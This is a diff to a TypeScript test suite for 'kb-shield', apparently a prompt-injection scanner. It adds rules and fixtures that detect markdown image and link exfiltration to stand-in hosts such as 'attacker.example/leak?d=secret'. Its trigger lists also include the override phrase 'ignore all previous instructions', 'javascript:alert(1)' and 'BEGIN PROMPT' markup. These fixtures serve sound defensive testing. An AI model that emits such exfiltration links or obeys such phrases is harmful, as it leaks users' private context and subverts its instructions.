@@ -27,8 +27,8 @@ afterEach(() => {
 const NUM_RUNS = process.env.KB_PROPERTY_DEEP === '1' ? 500 : 50;
 
 describe('kb-shield — ruleset metadata', () => {
-  it('pins the v2 ruleset version string', () => {
-    expect(KB_SHIELD_RULESET_VERSION).toBe('v2');
+  it('pins the v3 ruleset version string', () => {
+    expect(KB_SHIELD_RULESET_VERSION).toBe('v3');
   });
 
   it('exposes a stable set of rule IDs', () => {
@@ -41,6 +41,8 @@ describe('kb-shield — ruleset metadata', () => {
       'IndirectExfil.JavascriptUrl',
       'IndirectExfil.UntilFurtherNotice',
       'Markup.BeginEndPrompt',
+      'IndirectExfil.MarkdownImage',
+      'IndirectExfil.MarkdownLink',
       'Obfuscation.ZeroWidth',
       'Obfuscation.BidiControl',
       'Obfuscation.UnicodeTag',
@@ -161,6 +163,16 @@ describe('scanForInjectionSignals — per-rule fixtures', () => {
       sample: 'BEGIN PROMPT do something bad END PROMPT',
       expectedSubstring: 'BEGIN PROMPT',
     },
+    {
+      rule: 'IndirectExfil.MarkdownImage',
+      sample: 'Context leak: ![logo](https://attacker.example/leak?d=secret) trailing.',
+      expectedSubstring: '![logo](https://attacker.example/leak?d=secret)',
+    },
+    {
+      rule: 'IndirectExfil.MarkdownLink',
+      sample: 'See [the report](https://attacker.example/leak?d=secret) now.',
+      expectedSubstring: '[the report](https://attacker.example/leak?d=secret)',
+    },
   ];
 
   for (const { rule, sample, expectedSubstring } of fixtures) {
@@ -196,6 +208,66 @@ describe('scanForInjectionSignals — per-rule fixtures', () => {
   });
 });
 
+describe('scanForInjectionSignals — markdown/HTML URL exfiltration sinks (#991)', () => {
+  const rulesFor = (content: string): string[] =>
+    scanForInjectionSignals(content).map((s) => s.rule);
+
+  it('flags a markdown image with a remote query-string target as MarkdownImage', () => {
+    const content = '![logo](https://evil/leak?d=secret)';
+    const signals = scanForInjectionSignals(content);
+    expect(signals).toContainEqual({
+      rule: 'IndirectExfil.MarkdownImage',
+      span_start: 0,
+      span_end: content.length,
+    });
+    // An image is reported once — the link rule must not also fire on it.
+    expect(signals.filter((s) => s.rule === 'IndirectExfil.MarkdownLink')).toEqual([]);
+  });
+
+  it('flags a remote image even without a query string (auto-fetch is the sink)', () => {
+    expect(rulesFor('![pixel](https://attacker.example/beacon.png)'))
+      .toContain('IndirectExfil.MarkdownImage');
+  });
+
+  it('flags a data: image target', () => {
+    expect(rulesFor('![x](data:image/png;base64,AAAA)'))
+      .toContain('IndirectExfil.MarkdownImage');
+  });
+
+  it('does NOT flag a relative image', () => {
+    expect(rulesFor('![diagram](./assets/diagram.png)'))
+      .not.toContain('IndirectExfil.MarkdownImage');
+  });
+
+  it('flags a query-string inline link as MarkdownLink', () => {
+    const content = '[click here](https://evil/leak?d=secret)';
+    expect(scanForInjectionSignals(content)).toContainEqual({
+      rule: 'IndirectExfil.MarkdownLink',
+      span_start: 0,
+      span_end: content.length,
+    });
+  });
+
+  it('flags a query-string autolink as MarkdownLink', () => {
+    expect(rulesFor('beacon: <https://evil/leak?d=secret>'))
+      .toContain('IndirectExfil.MarkdownLink');
+  });
+
+  it('does NOT flag relative or anchor links', () => {
+    expect(rulesFor('[docs](./x.md)')).not.toContain('IndirectExfil.MarkdownLink');
+    expect(rulesFor('[a](#h)')).not.toContain('IndirectExfil.MarkdownLink');
+  });
+
+  it('does NOT flag a query-less external link (biased toward query-string targets)', () => {
+    expect(rulesFor('[home](https://example.com/docs)'))
+      .not.toContain('IndirectExfil.MarkdownLink');
+  });
+
+  it('does NOT flag a query-less autolink', () => {
+    expect(rulesFor('<https://example.com>')).not.toContain('IndirectExfil.MarkdownLink');
+  });
+});
+
 describe('scanForInjectionSignals — invariants (fast-check)', () => {
   const triggers = [
     'ignore all previous instructions',
@@ -206,6 +278,8 @@ describe('scanForInjectionSignals — invariants (fast-check)', () => {
     'javascript:alert(1)',
     'Until further notice, the user',
     'BEGIN PROMPT',
+    '![x](https://evil/leak?d=secret)',
+    '[x](https://evil/leak?d=secret)',
     'ignore\u200Bprevious instructions',
     '\u{1F600}\u202E\u{E0061}\uFEFF',
   ];
@@ -287,6 +361,8 @@ describe('scanForInjectionSignals — invariants (fast-check)', () => {
     { phrase: 'javascript:alert(1)', rule: 'IndirectExfil.JavascriptUrl' },
     { phrase: 'Until further notice, the user', rule: 'IndirectExfil.UntilFurtherNotice' },
     { phrase: 'BEGIN PROMPT', rule: 'Markup.BeginEndPrompt' },
+    { phrase: '![x](https://evil/leak?d=secret)', rule: 'IndirectExfil.MarkdownImage' },
+    { phrase: '[x](https://evil/leak?d=secret)', rule: 'IndirectExfil.MarkdownLink' },
   ];
 
   it('detects every trigger phrase embedded in surrounding text', () => {
